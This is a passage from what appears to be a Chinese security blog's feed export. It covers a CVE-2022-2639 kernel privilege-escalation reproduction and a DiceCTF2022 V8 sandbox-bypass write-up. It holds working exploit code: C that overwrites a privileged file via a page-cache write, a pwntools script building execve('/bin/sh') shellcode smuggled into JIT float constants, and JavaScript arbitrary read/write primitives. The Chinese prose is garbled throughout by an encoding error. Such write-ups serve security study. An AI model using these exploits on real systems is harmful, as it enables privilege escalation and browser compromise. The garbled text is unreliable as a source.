<p>åœ¨ kernel &gt;&#x3D; 5.8 ä¸­éœ€è¦ä¿®æ”¹ pipe buffer ä¸­ splice é¡µçš„flag |&#x3D; PIPE_BUF_FLAG_CAN_MERGEå³å¯ï¼ˆæœ‰èƒ½åŠ›å¯ä»¥é¡ºä¾¿æŠŠoffsetå’Œlenæ”¹æˆ0ï¼Œè¿™æ ·å°±èƒ½ä»æ–‡ä»¶çš„å¼€å¤´å¼€å§‹å†™ï¼‰ï¼›åœ¨ kernel &lt; 5.8 ä¸­ï¼Œéœ€è¦å…ˆleakä¸€ä¸‹pipe_bufferä¸­çš„anon_pipe_opsï¼Œç„¶åå°† splice é¡µçš„çš„opsæ”¹ä¸ºanon_pipe_opsï¼ˆå› ä¸º&lt;5.8ç‰ˆæœ¬ä¸­èƒ½å¦mergeæ˜¯çœ‹opsçš„ï¼‰ï¼ˆæœ‰èƒ½åŠ›ä¾ç„¶å¯ä»¥é¡ºä¾¿æŠŠoffsetå’Œlenæ”¹æˆ0ï¼‰ã€‚</p>
<p>â€”-æ‘˜è‡ª <a href="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">veritas501 åšå®¢</a></p>
</blockquote>
<p><img src="/img/CVE-2022-2639/2-14.png"></p>
<p>ä¸‹æ¬¡å¯¹ pipe å†™å…¥å°±ä¼šä¿®æ”¹æ–‡ä»¶çš„ page cacheï¼Œå¾—åˆ°å’Œ DirtyPipe ä¸€æ ·ä»»æ„æ–‡ä»¶å†™çš„èƒ½åŠ›ï¼å¯¹æœ¬åœ°ææƒæ¥è¯´åªè¦ä¿®æ”¹ suid ç¨‹åºçš„å†…å®¹æˆ–æ˜¯ä¿®æ”¹ &#x2F;etc&#x2F;passwd å³å¯ã€‚å‘ç›®æ ‡æ–‡ä»¶ä¸­å†™å…¥ attack_dataï¼Œå¹¶æ£€æŸ¥æ˜¯å¦æˆåŠŸå†™å…¥ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">logd(<span class="string">&quot;[4-12] try to overwrite %s&quot;</span>, ATTACK_FILE);</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ssize_t</span> nbytes = write(pipes[uaf_pipe_idx][<span class="number">1</span>], attack_data, <span class="keyword">sizeof</span>(attack_data));</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) die(<span class="string">&quot;[-] write failed&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">size_t</span>)nbytes &lt; <span class="keyword">sizeof</span>(attack_data)) die(<span class="string">&quot;[-] short write&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logd(<span class="string">&quot;[*] see if %s changed ...&quot;</span>, ATTACK_FILE);</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(ATTACK_FILE, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) die(<span class="string">&quot;[-] open attack file&quot;</span>);</span><br><span class="line">    <span class="type">char</span> tmp_buffer[<span class="number">0x10</span>];</span><br><span class="line">    read(fd, tmp_buffer, <span class="number">0x10</span>);</span><br><span class="line">    <span class="type">uint32_t</span> *ptr = (<span class="type">uint32_t</span> *)(tmp_buffer + <span class="number">9</span>);</span><br><span class="line">    <span class="keyword">if</span> (ptr[<span class="number">0</span>] != <span class="number">0x56565656</span>)</span><br><span class="line">        die(<span class="string">&quot;[-] overwrite attack file failed: 0x%08x&quot;</span>, ptr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/res.png"></p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>é€šè¿‡é¡µé£æ°´åˆ°ä¸€æ­¥ä¸€æ­¥è·å¾— UAF åˆ°æœ€ååˆ›é€ äº† DirtyPipe çš„æ¡ä»¶å®Œæˆä»»æ„æ–‡ä»¶å†™ï¼Œæ— éœ€æ³„éœ²å†…æ ¸åŸºå€å°±å®Œæˆäº†ææƒï¼Œä¸ºå…¶ä»–ç›´æ¥æˆ–è€…é€šè¿‡è½¬åŒ–èƒ½è·å¾—ç±»ä¼¼æ¡ä»¶çš„æ¼æ´åˆ©ç”¨æä¾›äº†æ–°æ€è·¯ã€‚</p>
<p>exp å¯è§ <a href="https://github.com/cxxz16/kernel_study/tree/main/cve-2022-2639">kernel_study&#x2F;cve-2022-2639 at main Â· cxxz16&#x2F;kernel_study (github.com)</a></p>
<p>ç¼–è¯‘å¥½çš„å†…æ ¸ã€æ–‡ä»¶ç³»ç»Ÿå’Œexpç­‰æ–‡ä»¶å¯è§ <a href="https://github.com/bsauce/kernel-exploit-factory">bsauce-exploitåŠæµ‹è¯•ç¯å¢ƒä¸‹è½½åœ°å€</a></p>
<p>æ–‡ç« ä¸­å¦‚æœä»»ä½•é”™è¯¯æˆ–ç–‘é—®ï¼Œæœ›å„ä½è¯»è€…ä¸åèµæ•™ï¼ŒåŠæ—¶æŒ‡æ­£ï¼Œéå¸¸æ„Ÿè°¢ã€‚æœŸå¾…ä¸å¤§å®¶å…±åŒäº¤æµè¿›æ­¥ã€‚</p>
<h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><ol>
<li><a href="https://bsauce.github.io/2022/07/16/CVE-2022-1015/#3-4-%E9%80%9A%E8%BF%87netlink%E4%B8%8Enftables-%E4%BA%A4%E4%BA%92">bsauce CVE-2022-1015</a></li>
<li><a href="https://bsauce.github.io/2022/11/24/CVE-2022-2639/">bsauce CVE-2022-2639</a></li>
<li><a href="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2022-2639 openvswitch LPE æ¼æ´åˆ†æ</a></li>
</ol>
]]></content>
      <categories>
        <category>cve å¤ç°</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>cve</tag>
      </tags>
  </entry>
  <entry>
    <title>DiceCTF2022 memoryhole &amp; V8æ²™ç®±ç»•è¿‡</title>
    <url>/2022/12/06/DiceCTF2022-memoryhole-V8%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>DiceCTF2022 memoryhole é¢˜ç›®å¤ç°ä¸ä¸¤ç§ V8 æ²™ç®±ç»•è¿‡æ–¹å¼å­¦ä¹ ã€‚</p>
<span id="more"></span>

<h1 id="æŒ‡é’ˆå‹ç¼©"><a href="#æŒ‡é’ˆå‹ç¼©" class="headerlink" title="æŒ‡é’ˆå‹ç¼©"></a>æŒ‡é’ˆå‹ç¼©</h1><p>V8 åœ¨å…¶å †ä¸­å®ç°äº†æŒ‡é’ˆå‹ç¼©ã€‚é€šè¿‡æŒ‡é’ˆå‹ç¼©ï¼Œä» V8 å †ä¸­çš„ä¸€ä¸ªå¯¹è±¡åˆ° V8 å †ä¸­çš„å¦ä¸€ä¸ªå¯¹è±¡ï¼ˆâ€œå †ä¸Šâ€ï¼‰çš„æ¯ä¸ªå¼•ç”¨éƒ½ä¼šæˆä¸ºè·å †åŸºå€çš„ 32 ä½åç§»é‡ï¼Œåªç•™ä¸‹å°‘æ•°å…·æœ‰æŒ‡å‘å¤–éƒ¨å¯¹è±¡çš„åŸå§‹æŒ‡é’ˆçš„å¯¹è±¡v8 å †ï¼ˆâ€œå †å¤–â€ï¼‰ã€‚å‹ç¼©æŒ‡é’ˆä»…åœ¨ 4GB è™šæ‹Ÿå†…å­˜åŒºåŸŸå†…æœ‰æ•ˆï¼Œç§°ä¸ºæŒ‡é’ˆå‹ç¼©ã€‚æŒ‡é’ˆå‹ç¼©å¯ä»¥é€šè¿‡å†…å­˜ä¸­çš„ ArrayBuffer å®ä¾‹æ¥å¯è§†åŒ–ã€‚ä¸‹é¢æ˜¾ç¤ºäº†æ²¡æœ‰æŒ‡é’ˆå‹ç¼©çš„å‡è®¾ ArrayBuffer å¯¹è±¡çš„å†…å­˜å¸ƒå±€ï¼š</p>
<p><img src="/img/Dicectf2022-memoryhole/0-0.png"></p>
<p>æŒ‡é’ˆå‹ç¼©åï¼š</p>
<p><img src="/img/Dicectf2022-memoryhole/0-1.png"></p>
<p><strong>æŒ‡é’ˆå‹ç¼©æ¯”è¾ƒå¥½ç»•è¿‡ï¼Œå› ä¸ºé™¤äº†å †ä¸ŠæŒ‡é’ˆï¼Œå †å¤–æŒ‡é’ˆéƒ½å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œå¦‚ backing storeï¼Œæ‰€ä»¥å¦‚æœèƒ½ç¯¡æ”¹ backing store è¿˜æ˜¯å¯ä»¥å®ç°æ— é™åˆ¶çš„ä»»æ„åœ°å€å†™ã€‚</strong></p>
<h1 id="Sandbox"><a href="#Sandbox" class="headerlink" title="Sandbox"></a>Sandbox</h1><p>ä¸ºäº†ä¿æŠ¤åŒä¸€è¿›ç¨‹çš„å…¶ä»–å†…å­˜å…å—æŸå®³ï¼ŒV8 å †ä¸­çš„æ‰€æœ‰åŸå§‹æŒ‡é’ˆå°± â€œsandboxifiedâ€ ï¼Œ<strong>å°†ä»–ä»¬è½¬æ¢ä¸ºç›¸å¯¹äºæ²™ç®±åº•éƒ¨çš„åç§»é‡æˆ–è½¬æ¢ä¸ºç´¢å¼•è¿›å…¥å¤–éƒ¨æŒ‡é’ˆè¡¨ï¼Œä»¥åŸºå€+åç§»çš„å½¢å¼è®¿é—®ï¼Œé™å®šäº†å¯è®¿é—®çš„èŒƒå›´ï¼Œä»è€Œé˜²æ­¢ä»»æ„åœ°å€è¯»å†™ã€‚</strong>æ²™ç®±çš„å®ç°é€šè¿‡ï¼š</p>
<ul>
<li>åœ¨ V8 åˆå§‹åŒ–æœŸé—´ä¿ç•™äº†ä¸€ä¸ªå¤§çš„ï¼ˆä¾‹å¦‚ 1TBï¼‰è™šæ‹Ÿåœ°å€ç©ºé—´åŒºåŸŸâ€”â€”æ²™ç®±ã€‚è¯¥åŒºåŸŸåŒ…å« pointer compression cageã€æ‰€æœ‰ V8 å †ä»¥åŠ ArrayBuffer çš„ backing store å’Œç±»ä¼¼å¯¹è±¡ã€‚</li>
<li>æ²™ç®±å†…ä½† V8 å †ä¹‹å¤–çš„æ‰€æœ‰å¯¹è±¡éƒ½ä½¿ç”¨å›ºå®šå¤§å°çš„åç§»é‡ï¼ˆä¾‹å¦‚ï¼Œåœ¨ 1TB æ²™ç®±çš„æƒ…å†µä¸‹ä¸º 40 ä½åç§»é‡ï¼‰è€Œä¸æ˜¯åŸå§‹æŒ‡é’ˆè¿›è¡Œå¯»å€ã€‚</li>
<li>æ‰€æœ‰å‰©ä½™çš„å †å¤–å¯¹è±¡éƒ½å¿…é¡»é€šè¿‡å¤–éƒ¨æŒ‡é’ˆè¡¨è¿›è¡Œå¼•ç”¨ï¼Œè¯¥è¡¨åŒ…å«æŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆä»¥åŠç±»å‹ä¿¡æ¯ï¼Œä»¥é˜²æ­¢ç±»å‹æ··æ·†æ”»å‡»ã€‚ç„¶åé€šè¿‡ç´¢å¼•ä» v8 å †ä¸­çš„å¯¹è±¡å¼•ç”¨æ­¤è¡¨ä¸­çš„æ¡ç›®ã€‚</li>
</ul>
<p><img src="/img/Dicectf2022-memoryhole/0-3.png"></p>
<p>åŸå§‹çš„å †å¤– backing store æŒ‡é’ˆï¼ˆç´«è‰²ï¼‰å·²è¢«æ›¿æ¢ä¸ºè·ç¦»æ²™ç®±åº•éƒ¨çš„ 40 ä½åç§»é‡ï¼ˆåç§»é‡ä¸º 0x45c00ï¼Œå‘å·¦ç§»åŠ¨ 24 ä½ä»¥ä¿è¯æœ€é«˜ä½ä¸ºé›¶ï¼‰ã€‚å¦ä¸€æ–¹é¢ï¼ŒæŒ‡å‘ ArrayBufferExtension å¯¹è±¡ï¼ˆæ©™è‰²ï¼‰çš„åŸå§‹æŒ‡é’ˆå·²æ›¿æ¢ä¸ºæŒ‡å‘å¤–éƒ¨æŒ‡é’ˆè¡¨çš„ 32 ä½ç´¢å¼•ã€‚</p>
<p>ç°åœ¨å‡è®¾æ”»å‡»è€…èƒ½å¤Ÿä»å¤šä¸ªçº¿ç¨‹ä»»æ„ç ´åæ²™ç®±å†…çš„å†…å­˜ï¼Œè¿˜éœ€è¦ä¸€ä¸ªé¢å¤–çš„æ¼æ´æ¥ç ´åæ²™ç®±å¤–çš„å†…å­˜ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<p>è¯¦ç»†çš„æ²™ç®±ç»†èŠ‚åœ¨<a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit#">V8 Sandbox - High-Level Design Doc - Google æ–‡æ¡£</a>ã€‚</p>
<p><img src="/img/Dicectf2022-memoryhole/0-2.png"></p>
<h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>æ¼æ´æ˜¯ç™½ç»™çš„æ•°ç»„é•¿åº¦ä»»æ„ä¿®æ”¹ã€‚ä½†æ˜¯å¼€å¯äº†æ²™ç®±ã€‚</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">   # Enable the experimental V8 sandbox.</span><br><span class="line">   # Sets -DV8_SANDBOX.</span><br><span class="line"><span class="deletion">-  v8_enable_sandbox = false</span></span><br><span class="line"><span class="addition">+  v8_enable_sandbox = true</span></span><br><span class="line"></span><br><span class="line">   # Enable external pointer sandboxing. Requires v8_enable_sandbox.</span><br><span class="line">   # Sets -DV8_SANDBOXED_EXTERNAL_POINRTERS.</span><br><span class="line"><span class="deletion">-  v8_enable_sandboxed_external_pointers = false</span></span><br><span class="line"><span class="addition">+  v8_enable_sandboxed_external_pointers = true</span></span><br><span class="line"></span><br><span class="line">   # Enable sandboxed pointers. Requires v8_enable_sandbox.</span><br><span class="line">   # Sets -DV8_SANDBOXED_POINTERS.</span><br><span class="line"><span class="deletion">-  v8_enable_sandboxed_pointers = false</span></span><br><span class="line"><span class="addition">+  v8_enable_sandboxed_pointers = true</span></span><br><span class="line"></span><br><span class="line">   # Enable all available sandbox features. Implies v8_enable_sandbox.</span><br><span class="line"><span class="deletion">-  v8_enable_sandbox_future = false</span></span><br><span class="line"><span class="addition">+  v8_enable_sandbox_future = true</span></span><br></pre></td></tr></table></figure>

<p>TypeArray ä¸­çš„ backing store æŒ‡é’ˆé™åˆ¶è¢« data_ptr ä»£æ›¿ï¼Œè®¡ç®—å…¬å¼ä¸º data_ptr &#x3D; js_base + (external_pointer &lt;&lt; 8) + base_pointerï¼Œ<code>%DebugPrint</code> ä¼šæ˜¾ç¤ºå·²ç»åŠ å®Œäº† js_base çš„å®Œæ•´çš„æŒ‡é’ˆï¼Œæ‰€ä»¥è¦æŸ¥çœ‹å†…å­˜çœ‹çœŸæ­£çš„å€¼ï¼Œä½†æ˜¯æ— è®ºè¿™ä¸¤ä¸ªæŒ‡é’ˆçš„å€¼æ˜¯ä»€ä¹ˆï¼Œdata_ptr éƒ½æ˜¯è¢«é™åˆ¶åœ¨äº† 40bit å†…çš„ç©ºé—´ã€‚</p>
<p><img src="/img/Dicectf2022-memoryhole/0-4.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/0-5.png"></p>
<p>ç»“åˆå‰æ–‡çŸ¥è¯†ï¼Œçªç ´æ²™ç®±æ‹¿åˆ° shell æœ‰ä¸¤ç§åŠæ³•ï¼šä¸€ç§æ˜¯åœ¨ 4 GB èŒƒå›´å†…ä»»æ„è¯»å†™æäº‹æƒ…ï¼›å¦ä¸€ç§å°±æ˜¯å†å¯»æ‰¾æ–°çš„åŒ…å« 64 ä½å¯ç”¨æŒ‡é’ˆçš„å¯¹è±¡ã€‚å¦‚ä¸‹å°±æ˜¯è¿™ä¸¤ç§æ–¹å¼çš„å…·ä½“å®ç°ã€‚</p>
<h2 id="æ–¹å¼ä¸€ï¼šåœ¨-jsFunction-ä¸­æ„é€ åŒ…å«-jit-shellcode-çš„ç«‹å³æ•°"><a href="#æ–¹å¼ä¸€ï¼šåœ¨-jsFunction-ä¸­æ„é€ åŒ…å«-jit-shellcode-çš„ç«‹å³æ•°" class="headerlink" title="æ–¹å¼ä¸€ï¼šåœ¨ jsFunction ä¸­æ„é€ åŒ…å« jit shellcode çš„ç«‹å³æ•°"></a>æ–¹å¼ä¸€ï¼šåœ¨ jsFunction ä¸­æ„é€ åŒ…å« jit shellcode çš„ç«‹å³æ•°</h2><p>å†™ä¸€ä¸ª jsFunctionï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">foo</span> = (<span class="params"></span>) =&gt;</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">&#125;</span><br><span class="line">%<span class="title class_">PrepareFunctionForOptimization</span>(foo);</span><br><span class="line"><span class="title function_">foo</span>();</span><br><span class="line">%<span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="title function_">foo</span>();</span><br><span class="line">%<span class="title class_">DebugPrint</span>(foo);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="title function_">foo</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/1-1.png"></p>
<p>å¯ä»¥çœ‹åˆ° code å­—æ®µåœ¨ rx æ®µã€‚</p>
<p>åœ¨ JSFunction ä¸­ä¿®æ”¹codeå­—æ®µä¸ºä¸€ä¸ªé”™è¯¯çš„åœ°å€ï¼š</p>
<p><img src="/img/Dicectf2022-memoryhole/1-2.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/1-3.png"></p>
<p>æŒ‰cç»§ç»­è¿è¡Œï¼ˆæ³¨æ„åœ¨ systembreak åè¦è°ƒç”¨ functionï¼‰ï¼š</p>
<p><img src="/img/Dicectf2022-memoryhole/1-4.png"></p>
<p>å¯ä»¥çœ‹å‡ºè¿™æ®µçš„é€»è¾‘ä¸ºï¼š<strong>test dword ptr [rcx+0x1b], 0x20000000 åï¼Œå¦‚æœä¸è·³è½¬ï¼Œåˆ™å°† rcx + 0x3fï¼Œç„¶å jmp rcxï¼ˆå‰é¢çš„ jmp æ˜¯è·³è½¬åˆ° jmp rcx æŒ‡ä»¤çš„åœ°å€ï¼Œçœ‹åœ°å€ä¸åç§»ï¼‰ï¼Œå¦‚æœæˆ‘ä»¬å°† [rcx+0x1b] å¤„çš„å€¼ä¼ªé€ å¥½ï¼Œä¸0x20000000ä¸åä¸º0ï¼Œé‚£ä¹ˆåˆ° jne çš„æ—¶å€™å°±ä¼šä¸è·³è½¬ç»§ç»­æ‰§è¡Œã€‚è€Œ rcx ä¸­çš„å€¼å¯æ§ã€‚é‚£ä¹ˆå°±èƒ½åŠ«æŒ ripã€‚</strong></p>
<p>è¿™é‡Œè¡¥å……ä¸€ä¸‹æ­£å¸¸çš„é€»è¾‘ï¼ˆçŒœæµ‹ï¼‰ï¼š</p>
<p><img src="/img/Dicectf2022-memoryhole/1-5.png"></p>
<p>åŸæœ¬ rcx ä¸­çš„å€¼åº”ä¸º code çš„åœ°å€ï¼Œç”±äºæ˜¯æŒ‡é’ˆï¼Œå€¼è¢«+1ï¼Œæ‰€ä»¥ +0x1b ä¾¿å¯ä»¥åˆ° 0x1c è¿™æ ·çš„æ•´ dword åœ°å€å¤„ã€‚è¿™é‡Œ test åä¸ä¸º0ï¼Œé‚£ä¹ˆ jne å°±ä¼šè·³è½¬ï¼Œåº”è¯¥æ˜¯è·³è½¬åˆ°æ­£å¸¸çš„é€»è¾‘å»æ‰§è¡Œã€‚</p>
<p><img src="/img/Dicectf2022-memoryhole/1-6.png"></p>
<p>ç»è¿‡ä¼˜åŒ–åçš„jitä»£ç ï¼Œå­˜æ”¾åœ¨è·ç¦» code å­—æ®µå€¼ä¸è¿œå¤„ã€‚</p>
<p>é‚£æ¥ä¸‹æ¥å°±æ˜¯è¦å…ˆå°† shellcode è—åœ¨ double è¡¨ç¤ºçš„ç«‹å³æ•°ä¸­ã€‚</p>
<p>é€šè¿‡ <a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=jmp+0xe&arch=x86-64&as_format=inline#assembly">Online Assembler and Disassembler (shell-storm.org)</a> å¾—åˆ°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jmp 0xe  =&gt; &quot;\xeb\x0c&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">jmp = <span class="string">&#x27;\xeb\x0c&#x27;</span></span><br><span class="line">shell = u64(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_double</span>(<span class="params">code</span>):</span><br><span class="line">	<span class="keyword">assert</span> <span class="built_in">len</span>(code) &lt;= <span class="number">6</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(u64(code.ljust(<span class="number">6</span>, <span class="string">&#x27;\x00&#x27;</span>) + jmp))[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">make_double(asm(<span class="string">&quot;push %d; pop rax&quot;</span> % (shell &gt;&gt; <span class="number">0x20</span>)))</span><br><span class="line">make_double(asm(<span class="string">&quot;push %d; pop rdx&quot;</span> % (shell % <span class="number">0x100000000</span>)))</span><br><span class="line">make_double(asm(<span class="string">&quot;shl rax, 0x20; xor esi, esi&quot;</span>))</span><br><span class="line">make_double(asm(<span class="string">&quot;add rax, rdx; xor edx, edx; push rax&quot;</span>))</span><br><span class="line">code = asm(<span class="string">&quot;mov rdi, rsp; push 59; pop rax; syscall&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(code) &lt;= <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(u64(code.ljust(<span class="number">8</span>, <span class="string">&#x27;\x90&#x27;</span>)))[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>

<p>å¦‚ä¸Šè„šæœ¬å¾—åˆ° shellcodeï¼Œç„¶åå†å°†åå…­è¿›åˆ¶è½¬ IEEE754 æµ®ç‚¹æ•°ï¼ˆå†™åˆ°è¿™åˆæƒ³èµ·äº†ä»Šå¹´ qwb çš„é‚£é“ jit â€¦ï¼‰ã€‚é€šè¿‡<a href="https://www.binaryconvert.com/result_double.html?hexadecimal=0CEB580068732F68">å·¥å…·</a>ï¼Œåœ¨ä¸‹é¢ binary ä¸­è¾“å…¥åå…­è¿›åˆ¶æ•°ï¼š</p>
<p><img src="/img/Dicectf2022-memoryhole/1-7.png"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.95538254221075331056310651818E-246</span></span><br><span class="line"><span class="number">1.95606125582421466942709801013E-246</span></span><br><span class="line"><span class="number">1.99957147195425773436923756715E-246</span></span><br><span class="line"><span class="number">1.95337673326740932133292175341E-246</span></span><br><span class="line"><span class="number">2.63486047652296056448306022844E-284</span></span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥é€šè¿‡åœ¨ func1 çš„ç«‹å³æ•°ä¸­å¸ƒç½®å¥½ shellcodeï¼Œç¯¡æ”¹ func2 çš„ code å­—æ®µç›´æ¥æŒ‡å‘è¿™æ®µ shellcodeï¼Œå†è°ƒç”¨ func2 å³å¯è§¦å‘ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">func</span> = (<span class="params"></span>) =&gt;</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">f</span> = (<span class="params"></span>) =&gt; <span class="number">123</span>;	<span class="comment">// å‡†å¤‡ç¯¡æ”¹ code çš„ func2</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">const</span> o = &#123;<span class="attr">x</span>:<span class="number">1337</span>, <span class="attr">a</span>:f, <span class="attr">b</span>:fun&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ua = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">2</span>);</span><br><span class="line">arr.<span class="title function_">setLength</span>(<span class="number">100</span>);</span><br><span class="line"><span class="title function_">d22u</span>(arr[<span class="number">5</span>]);</span><br><span class="line"><span class="keyword">const</span> funAddr = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">const</span> fAddr = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ° func å’Œ f çš„åœ°å€ï¼š</p>
<p><img src="/img/Dicectf2022-memoryhole/1-8.png"></p>
<p>å†å‡†å¤‡æ³„éœ² typearray çš„ base_pointerã€‚</p>
<p>åœ¨è¿™è¿‡ç¨‹ä¸­å‘ç° typearray ä¸­å¦‚æœå¼€è¾Ÿæ•°ç»„é•¿åº¦å°äºç­‰äº16åˆ™ data_ptr å­—æ®µå¯ç”¨ï¼Œå¦åˆ™ä¸º nil å¹¶ä¸”åœ¨å†…å­˜ä¸­æ²¡æœ‰å…¶å€¼ï¼ˆä»¥å‰éƒ½æ˜¯ç›´æ¥å¼€è¾Ÿå¾ˆå°çš„æ•°ç»„å¹¶æ²¡æœ‰æ³¨æ„åˆ°è¿™ä¸ªé—®é¢˜ï¼‰ï¼š</p>
<p><img src="/img/Dicectf2022-memoryhole/1-9.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/1-10.png"></p>
<p>ä¸ºäº†æ–¹ä¾¿è®¡ç®—ï¼Œè¿™é‡Œå°‘å¼€è¾Ÿä¸¤ä¸ªå°±è¡Œï¼Œç”±äºä»–å’Œelementsç±»ä¼¼ï¼Œé€šè¿‡ oob æ•°ç»„è¶Šç•Œè¯» typearray ä¸­çš„å…ƒç´ ï¼Œè¿›è€Œç¡®å®š base_pointer æƒ³å¯¹äº oob arr çš„ç´¢å¼•ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ua[<span class="number">0</span>] = <span class="number">0xdeedbeef</span>;</span><br><span class="line"><span class="keyword">var</span> base_ptr = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">10</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">d22u</span>(arr[i]);</span><br><span class="line">    <span class="keyword">const</span> high = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">const</span> low = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (high == <span class="number">0xdeedbeef</span> || low == <span class="number">0xdeedbeef</span>) &#123;</span><br><span class="line">        base_ptr = i + <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/1-11.png"></p>
<p>å¯ä»¥ä¿®æ”¹ base_pointer å°±å¯ä»¥å®ç°åœ¨åŸºå€çš„ 4GB èŒƒå›´å†…çš„ä»»æ„åœ°å€å†™äº†ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead</span>(<span class="params">off</span>) &#123;</span><br><span class="line">    arr[base_ptr] = <span class="title function_">u2d</span>((off-<span class="number">7</span>) * <span class="number">0x100000000</span>);</span><br><span class="line">    <span class="keyword">return</span> ua[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite</span>(<span class="params">off, val</span>) &#123;</span><br><span class="line">    arr[base_ptr] = <span class="title function_">u2d</span>((off-<span class="number">7</span>) * <span class="number">0x100000000</span>);</span><br><span class="line">    ua[<span class="number">0</span>] = val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†æŸ¥çœ‹ func1 code ä¸­ç»è¿‡ä¼˜åŒ–çš„ä»£ç ï¼Œé”™ä½çœ‹ jitï¼š</p>
<p><img src="/img/Dicectf2022-memoryhole/1-12.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/1-13.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/1-14.png"></p>
